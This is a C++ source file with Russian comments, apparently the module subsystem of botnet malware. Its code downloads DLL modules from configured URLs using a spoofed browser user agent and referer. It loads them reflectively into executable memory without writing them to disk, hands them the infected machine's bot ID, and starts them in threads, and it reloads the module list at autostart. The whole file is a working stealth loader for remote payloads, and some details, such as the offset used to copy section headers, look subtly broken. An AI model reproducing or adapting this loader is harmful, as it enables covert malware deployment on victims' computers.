#include <windows.h>
#include <wininet.h>
#include <ws2tcpip.h>

#include "defines.h"
#include "core.h"
#include "corehook.h"
#include "localconfig.h"

#include "..\common\mem.h"
#include "..\common\str.h"
#include "..\common\debug.h"
#include "..\common\wsocket.h"
#include "..\common\sync.h"
#include "..\common\process.h"
#include "modulesystem.h"

#define REGISTRY_MAX_VALUE_DATA_SIZE (1 * 1024 * 1204)

void ModuleSystem::init(void)
{

}

void ModuleSystem::uninit(void)
{

}

#define MAX_SECTIONS 10  // максимальное кол-во секций в файле
#pragma warning(disable:4200)
typedef unsigned long ULONG, *PULONG;
typedef unsigned short USHORT, *PUSHORT;

// структура для релоков
typedef struct _FIXREC
{
 ULONG PageRVA;
 ULONG BlockSize;
 USHORT TOR[];
} TFIXREC,*PFIXREC;

// структура таблицы импорта
typedef struct _IMPORT_TABLE
{
	ULONG LookUp;
	ULONG TimeStamp;
	ULONG ForwardChain;
	ULONG NameRVA;
	ULONG AddresTableRVA;
} IMPORT_TABLE, *PIMPORT_TABLE;

#pragma pack(1)
// структура таблица адресов
typedef struct _ADDRESS_TABLE
{
	USHORT Hint;
	char Name[];
} ADDRESS_TABLE, *PADDRESS_TABLE;

#pragma pack()

 //Обработчик импорта
ULONG ProgressImport(ULONG filebase)
{
	ULONG PE;
	HMODULE lib;
	PIMPORT_TABLE ImportTable;
	PADDRESS_TABLE AddressTable;
	ULONG IAT_Index;
	ULONG RVA;
	ULONG addr;

	PE = *(ULONG*)(filebase + 0x3C) + filebase; // адрес PE заголовка
	if (!*(ULONG*)(PE + 0x80)) return 1; // если нет импорта то выходим
	ImportTable = (PIMPORT_TABLE)(*(ULONG*)(PE + 0x80) + filebase); // адрес таблицыы импорта
	
	while (ImportTable->NameRVA) // пока есть DLL откуда нужно импортировать функции
	{
		// проверим что DLL была ранее загружена
		lib = GetModuleHandleA((char*)(ImportTable->NameRVA + filebase)); 
		if (!lib) // если не загружена была, то загрузим её.
		{
			lib = LoadLibraryA((char*)(ImportTable->NameRVA + filebase));
		}
		if (!lib) return 0; // если не загрузилась, значит ошибка
		if (ImportTable->LookUp) // Если импорт идет через LookUp
		{
			RVA = ImportTable->LookUp + filebase;
		}
		else // если через таблицу адресов импорта
		{
			RVA = ImportTable->AddresTableRVA + filebase;
		}
		IAT_Index = 0;
		while (*(ULONG*)RVA) // если есть ссылка на таблицу имен
		{
			AddressTable = (PADDRESS_TABLE)(*(ULONG*)RVA + filebase); // получаем адрес структуры где хранится HINT NAME
			if (AddressTable->Name[0]) // если импорт по имени
			{
				addr = (ULONG)GetProcAddress(lib, AddressTable->Name); // найдем адрес
			}
			else // если импорт по ординалу
			{
				addr = (ULONG)GetProcAddress(lib, (char*)AddressTable->Hint);
			}
			// если есть IAT то сохраним в неё найденный адрес
			if (ImportTable->AddresTableRVA)
			{
				*(ULONG*)(ImportTable->AddresTableRVA + filebase + IAT_Index) = addr;
			}
			else // иначе сохраним туда откуда брали
			{
				*(ULONG*)RVA = addr;
			}
			RVA += 4; // сделающий элемент
			IAT_Index += 4;
		}
		ImportTable = (PIMPORT_TABLE)((ULONG)ImportTable+sizeof(IMPORT_TABLE)); // следующая таблица
	}

	return 1;
}

// обработка релоков
ULONG ProgressReloc(ULONG filebase)
{
	ULONG PE;
	ULONG IB;
	ULONG cnt;
	ULONG x;
	ULONG Delta;
	PFIXREC fixrec;
	USHORT fixtype;
	USHORT fixoffset;
  
	PE = *(ULONG*)(filebase + 0x3C) + filebase; // получаем адрес PE заголовка
	IB = *(ULONG*)(PE + 0x34); // IMAGE BASE 
	if (filebase == IB) return 1; // Если совпадает с загруженным адресом, то фиксить не нужно ничего
	Delta = filebase - IB; // выцесляем дельта смещение.
	
	if (!*(ULONG*)(PE + 0xA0)) return 1; // если нет релоков то выходим
	fixrec = (PFIXREC)(*(ULONG*)(PE + 0xA0) + filebase); // получаем адрес таблицы релоков
	while (fixrec->BlockSize) // если таблица не пуста
	{
		cnt = (fixrec->BlockSize - 8) >> 1; // вычеслим кол-во элементов
		for (x = 0; x < cnt; x++)
		{
			fixtype = (fixrec->TOR[x]) >> 12; // типа фиксации
			fixoffset = (fixrec->TOR[x]) % 4096; // офсет внутри 4-х килобайтового блока
			if (!fixtype) continue; // если 0, то фиксация не нужна
			if (fixtype == 3) // если 3, то прибавить дельта смещение
			{
				*(ULONG*)(filebase+fixoffset+fixrec->PageRVA) = *(ULONG*)(filebase+fixoffset+fixrec->PageRVA) + Delta;
			} else return 0; // все остальные случае вызовут ошибку (хотя их и не будет теоретически)
		}
		fixrec = (PFIXREC)((ULONG)fixrec + fixrec->BlockSize); // следующая таблица реловок
	} 
	
	return 1;
}

 //непосредственно функция загрузки DLL 
HMODULE __stdcall HideLoadLibrary(void* moduleStart)
{
	ULONG retadr = 0;
	DWORD rb;
	HANDLE hFile;
	IMAGE_DOS_HEADER DosHeader;
	IMAGE_NT_HEADERS PeHeader;
	IMAGE_SECTION_HEADER Section[MAX_SECTIONS];
	char tmp[1024];

	if (moduleStart != 0)
	{
		// считаем DOS заголовок
		Mem::_copy(&DosHeader,moduleStart,sizeof(IMAGE_DOS_HEADER));
		if (DosHeader.e_magic == IMAGE_DOS_SIGNATURE) // проверим сигнатуру
		{
			// если есть какимето данные между DOS заголовком и PE 
			// то считаем их. В MS компиляторах это часто Rich данные
			if (sizeof(IMAGE_DOS_HEADER) < DosHeader.e_lfanew)
			{
				Mem::_copy(&tmp[0],moduleStart,DosHeader.e_lfanew - sizeof(IMAGE_DOS_HEADER));
			}
			Mem::_copy(&PeHeader, (LPBYTE)moduleStart + DosHeader.e_lfanew,sizeof(IMAGE_NT_HEADERS));
			if (PeHeader.Signature == IMAGE_NT_SIGNATURE) // проверим сигнатуру
			{
				// считаем 10 секций
				Mem::_copy(&Section[0], (LPBYTE)moduleStart + DosHeader.e_lfanew, sizeof(IMAGE_SECTION_HEADER)*PeHeader.FileHeader.NumberOfSections);
				// выделим память столько, сколько указано в SIZE OF BASE
				retadr = (ULONG)VirtualAlloc(0, PeHeader.OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
				
				if (retadr) // если память выделилась
				{
					// скопируем туда DOS заголовок
					Mem::_copy((void*) retadr, &DosHeader, sizeof(IMAGE_DOS_HEADER));
					// скопируем туда PE заголовок
					Mem::_copy((void*)(retadr + DosHeader.e_lfanew), &PeHeader, sizeof(IMAGE_NT_HEADERS));
					// скопируем туда таблицу секций
					Mem::_copy((void*)(retadr + DosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS)), &Section[0], sizeof(IMAGE_SECTION_HEADER) * PeHeader.FileHeader.NumberOfSections);
					// если есть Rich данные то и их тоже скопируем
					if (sizeof(IMAGE_DOS_HEADER) < DosHeader.e_lfanew) 
					{
						Mem::_copy((void*)(retadr + sizeof(IMAGE_DOS_HEADER)), &tmp[0], DosHeader.e_lfanew - sizeof(IMAGE_DOS_HEADER));
					}
					// обработаем каждую секцию
					for (int i = 0; i < PeHeader.FileHeader.NumberOfSections; i++)
					{
						// считаем всё секцию
						Mem::_copy((void*)(retadr + Section[i].VirtualAddress), (LPBYTE)moduleStart + Section[i].PointerToRawData,Section[i].SizeOfRawData);
					}
					// Обработаем релоки
					if (!ProgressReloc(retadr)) // если ошибка
					{
						VirtualFree((void*)retadr, 0, MEM_RELEASE); // освободим память
						retadr = 0;
					}
					else if (!ProgressImport(retadr))// обработаем импорт
					{
						VirtualFree((void*)retadr, 0, MEM_RELEASE);// если ошибка освободим память
						retadr = 0;
					}
					else
					{
						__asm
						{
							mov eax, PeHeader.OptionalHeader.AddressOfEntryPoint
							add eax, retadr // EAX = ENTRY POINT
							push 0
							push DLL_PROCESS_ATTACH // ставим флаг что подгрузили DLL
							push retadr
							call eax // передадим управление на точку входа в DLL 
						}
					}
				}
			}
		}
		CloseHandle(hFile); // закрываем файл
	}

	return (HMODULE)retadr; // возвращаем адрес загруженного модуля в памяти
}
// Непосредственно функция Поиска адреса
void* HideGetProcAddress(HMODULE hModule, char* lpProcName)
{
	ULONG PE;
	PIMAGE_EXPORT_DIRECTORY ED;
	PULONG NamePointerRVA;
	PUSHORT OrdinalTableRVA;
	PULONG AddressTableRVA;

	ULONG ret = 0;
	USHORT hint = 0;
	USHORT index;
	char * name;
	ULONG addr;
	ULONG CNT_FUNC;
	
	if ((ULONG)lpProcName <= 0xFFFF)// если импорт по ординалу
	{
		hint = (USHORT)lpProcName; // запишем наш ординал
	}

	if (hModule) // если указан модуль откуда грузить
	{
		PE = *(ULONG*)((ULONG)hModule + 0x3C) + (ULONG)hModule;// адрес PE заголовка
		ED = (PIMAGE_EXPORT_DIRECTORY)(*(ULONG*)((ULONG)PE + 0x78) + (ULONG)hModule); // адрес таблицы экспорта
	
		NamePointerRVA = (ULONG*)(ED->AddressOfNames + (ULONG)hModule); // адрес таблицы имен
		OrdinalTableRVA	= (USHORT*)(ED->AddressOfNameOrdinals + (ULONG)hModule); // адрес таблицы ординалов
		AddressTableRVA = (ULONG*)(ED->AddressOfFunctions + (ULONG)hModule); // адрес таблицы адерсов
		
		// вычесляем наибольшее значение - кол-во функций
		if (ED->NumberOfNames > ED->NumberOfFunctions) 
		{
			CNT_FUNC = ED->NumberOfNames;
		}
		else
		{
			CNT_FUNC = ED->NumberOfFunctions;
		}

		// пройдемся по всем функциям
		for (USHORT x = 0; x < CNT_FUNC; x++)
		{
			if (x < ED->NumberOfFunctions) // если есть имя у функции
			{
				name = (char*)(NamePointerRVA[x] + (ULONG)hModule); // запомним имя
				index = OrdinalTableRVA[x]; // запомним ординал
			}
            else // если имени нет
			{
				name = 0; // имени нет
				index = x; // ординал = текущей позиции
			}

			// вычесляем адрес функции 
			addr = AddressTableRVA[index] + (ULONG)hModule;
			if ((hint == index + ED->Base)|| // если это наш ординал
				(name && Str::_CompareA(name, lpProcName,-1,-1)==0)) // если есть имя и оно наше
			{
				ret = addr; // нашли адрес
				break; // прекратим обход экспорта
			}
		}
	}
	 
	return (void*)ret; // вернем адрес 
}


////////////////////////////////////////////////////////////////////////////////////////////


static bool isValidList(const LPSTR list, DWORD listSize)
{
  return Str::_isValidMultiStringA(list, listSize);
}

bool ModuleSystem::_addStatic(LPSTR moduleUrl)
{
	
  WORD newItemSize;
  char newItem[256 * 3 + 3 + 1];

  //Генирируем элемент.
  {
    BYTE moduleUrlLen = (BYTE)Str::_LengthA(moduleUrl);
    char *offset        = newItem;
    
    if(moduleUrlLen == 0)return false;

    newItemSize = (moduleUrlLen + 1);

    Str::_CopyA(offset, moduleUrl, moduleUrlLen);
    offset += moduleUrlLen + 1;

    *offset = 0; //Завершающий байт мульти-строки.
    
    CWA(user32, CharLowerBuffA)(newItem, newItemSize);
  }
  
  //Открываем конфигурацию.
  BinStorage::STORAGE *config = LocalConfig::beginReadWrite();
  if(config == NULL)return false;
    
  //Получем список сущетвующих элементов.
  bool ok = true;
  DWORD itemListSize;
  LPSTR itemList = (LPSTR)BinStorage::_getItemDataEx(config, LocalConfig::ITEM_MODULES_LIST, BinStorage::ITEMF_IS_SETTING, &itemListSize);

  //Если элемент существует, ищим клон.
  if(isValidList(itemList, itemListSize))
  {
    LPSTR curItem = itemList;
    do
    {
      //Проверяем доступно ли места больше чем, размер искомого элемента.
      if((DWORD)((itemList + itemListSize) - curItem) <= newItemSize)break;
      
      //Сравниваем.
      if(Mem::_compare(curItem, newItem, newItemSize) == 0)
      {
        WDEBUG0(WDDT_INFO, "Item already exists.");
        ok = false;
        break;
      }
    }
    while((curItem = Str::_multiStringGetIndexA(curItem, 0)) != NULL);
    
    if(ok == true && (ok = Mem::reallocEx(&itemList, itemListSize + newItemSize)) == true)
    {
      Mem::_copy(itemList + itemListSize - 1, newItem, newItemSize + 1);
      ok = BinStorage::_modifyItemById(&config, LocalConfig::ITEM_MODULES_LIST, BinStorage::ITEMF_IS_SETTING | BinStorage::ITEMF_COMBINE_OVERWRITE, itemList, itemListSize + newItemSize);
    }
  }
  //Если элемент не найден, добавляем новый.
  else
  {
    if(itemList == NULL)ok = BinStorage::_addItem(&config, LocalConfig::ITEM_MODULES_LIST, BinStorage::ITEMF_IS_SETTING | BinStorage::ITEMF_COMBINE_OVERWRITE, newItem, newItemSize + 1);
    else                ok = BinStorage::_modifyItemById(&config, LocalConfig::ITEM_MODULES_LIST, BinStorage::ITEMF_IS_SETTING | BinStorage::ITEMF_COMBINE_OVERWRITE, newItem, newItemSize + 1);
  }
  Mem::free(itemList);

  if(ok == false)
  {
    Mem::free(config);
    config = NULL;
  }
  else
  {
	  WDEBUG0(WDDT_INFO, "Starting module from addStatic");
	  if(_loadModule(moduleUrl)==false) WDEBUG0(WDDT_ERROR, "Error while trying to load module");
  }

  return LocalConfig::endReadWrite(config);

}

bool ModuleSystem::_removeStatic(LPSTR moduleUrl)
{
  //Загружаем конфиг.
  BinStorage::STORAGE *config = LocalConfig::beginReadWrite();
  if(config == NULL)return false;

  //Получаем список элементов.
  DWORD itemListSize;
  LPSTR itemList = (LPSTR)BinStorage::_getItemDataEx(config, LocalConfig::ITEM_MODULES_LIST, BinStorage::ITEMF_IS_SETTING, &itemListSize);
  
  //Элементов нет.
  if(itemList == NULL)
  {
    Mem::free(config);
    return LocalConfig::endReadWrite(NULL);
  }

  //Проверяем правильность списка.
  bool changed = false;
  if(isValidList(itemList, itemListSize))
  {
    //Создаем копию списка для копирования в него, элементов не попавших под маску.
    LPSTR newItemList = (LPSTR)Mem::alloc(itemListSize);    
    if(newItemList != NULL)  
    {
      //Ишим элементы.
      LPSTR curItem = itemList;
      LPSTR offset  = newItemList;
      int len;

      do
      {
        LPSTR curModuleUrl = curItem;

        if(Str::_matchExA(moduleUrl, curModuleUrl))
        {
          changed = true;
        }
        else
        {
          len = Str::_LengthA(curModuleUrl);
          Str::_CopyA(offset, curModuleUrl, len);
          offset += len + 1;

          *offset = 0; //Завершающий байт мульти-строки.
        }
      }
      while((curItem = Str::_multiStringGetIndexA(curItem, 0)) != NULL);
      
      if(changed == true)
      {
        if(offset == newItemList)offset--; //Почти аналог BinStorage::ITEMF_COMBINE_DELETE.
        changed = BinStorage::_modifyItemById(&config, LocalConfig::ITEM_MODULES_LIST, BinStorage::ITEMF_IS_SETTING | BinStorage::ITEMF_COMBINE_OVERWRITE, newItemList, offset - newItemList + 1);
      }
      Mem::free(newItemList);
    }
  }
  Mem::free(itemList);

  if(changed == false)
  {
    Mem::free(config);
    config = NULL;
  }

  return LocalConfig::endReadWrite(config);
}

bool ModuleSystem::_autoStart()
{
	bool retval=true;
	if(Core::isActive())
	{
		BinStorage::STORAGE *config = LocalConfig::getCurrent();
		if(config != NULL)
		{
			DWORD itemListSize;
			LPSTR itemList = (LPSTR)BinStorage::_getItemDataEx(config, LocalConfig::ITEM_MODULES_LIST, BinStorage::ITEMF_IS_SETTING, &itemListSize);
        
			if(itemList != NULL && isValidList(itemList, itemListSize))
			{
				LPSTR curItem = itemList;
				do
				{
				  LPSTR curModuleUrl = curItem;
				  if(_loadModule(curModuleUrl)==false)retval=false;
				  
				}
				while((curItem = Str::_multiStringGetIndexA(curItem, 1)) != NULL);
			}
			Mem::free(itemList);
			Mem::free(config);

		}

	}
	return retval;
}
typedef void (_cdecl *TAKEBOTGUID)(char*);
typedef bool (_cdecl *INIT)(char*);
typedef bool (_cdecl *START)();
TAKEBOTGUID TakeBotGuid;
INIT Init;
START Start;
bool WINAPI init(void* params)
{
	return Init((char*)params);
}
bool WINAPI start()
{
	return Start();
}
bool ModuleSystem::_loadModule(LPSTR moduleUrl)
{
	MEMDATA memData;
	Wininet::CALLURLDATA cud;
	Core::initDefaultCallUrlData(&cud);
	cud.hStopEvent               = coreData.globalHandles.stopEvent;
	cud.pstrURL                  = moduleUrl;
	cud.DownloadData_dwSizeLimit = REGISTRY_MAX_VALUE_DATA_SIZE;
	cud.pstrUserAgent = "Mozilla/5.55 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.4.3 (FM Scene 8.12.1)";
	cud.SendRequest_pstrReferer = "http://google.com";

	if(Wininet::_CallURL(&cud, &memData))
	{
		WDEBUG0(WDDT_INFO, "Module downloaded");
		HMODULE module = HideLoadLibrary(memData.data);
		TakeBotGuid = (TAKEBOTGUID)HideGetProcAddress(module, "TakeBotGuid");
		Init = (INIT)HideGetProcAddress(module, "Init");
		Start = (START)HideGetProcAddress(module, "Start");
		if(TakeBotGuid == 0 || Init == 0 || Start == 0) {Mem::free(memData.data);return false;}
		LPSTR url = Str::_unicodeToAnsiEx(coreData.peSettings.compId,-1);
		if(url){TakeBotGuid(url);WDEBUG0(WDDT_INFO, "TBG passed");}
		WDEBUG0(WDDT_INFO, "TakeBotGuid finished");
		CreateThread(0,0,(LPTHREAD_START_ROUTINE)init,"",0,0);
		WDEBUG0(WDDT_INFO, "Init thread created");
		Sleep(5000);
		CreateThread(0,0,(LPTHREAD_START_ROUTINE)start,0,0,0);
		WDEBUG0(WDDT_INFO, "Start thread created");
		return true;
	}
	return false;
}